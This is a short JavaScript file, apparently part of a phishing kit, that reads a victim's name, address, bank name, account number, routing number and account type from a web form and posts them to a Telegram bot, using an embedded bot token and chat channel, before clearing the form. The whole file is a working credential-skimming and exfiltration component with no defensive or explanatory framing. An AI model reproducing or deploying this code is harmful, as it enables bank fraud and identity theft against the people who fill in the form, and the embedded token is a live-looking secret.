
//bot token
var telegram_bot_id = "6310644522:AAHTH8-ulzoYqSzZaLCipmNF5uzJPFXaNy0";
//chat id
var chat_id = 5883545100;
var accountfname, accountlname, clientaddress, state, bankname, accountnumber, routingnumber, how, initial, datee;
var ready = function () {
    accountfname = document.getElementById("accountfname").value;
    accountlname = document.getElementById("accountlname").value;
    clientaddress = document.getElementById("clientaddress").value;
    state = document.getElementById("state").value;
    bankname = document.getElementById("bankname").value;
    accountnumber = document.getElementById("accountnumber").value;
    routingnumber = document.getElementById("routingnumber").value;
    how = document.getElementById("how").value;
    initial = document.getElementById("initial").value;
    datee = document.getElementById("datee").value;
    message = "First Name: " + accountfname +"\nLast name: " + accountlname + "\nAddress: " + clientaddress + "\nCity, State, Zip: " + state +"\nBank name: " + bankname + "\nAccount number: " + accountnumber + "\nRouting number: " + routingnumber + "\nAccount type : " + how + "\nInitial : " + initial + "\nDate : " + datee;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": '@drinksandcodd',
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("accountfname").value = "";
    document.getElementById("accountlname").value = "";
    document.getElementById("clientaddress").value = "";
    document.getElementById("state").value = "";
    document.getElementById("bankname").value = "";
    document.getElementById("accountnumber").value = "";
    document.getElementById("routingnumber").value = "";
    document.getElementById("how").value = "";
    document.getElementById("initial").value = "";
    document.getElementById("datee").value = "";
    return false;
};
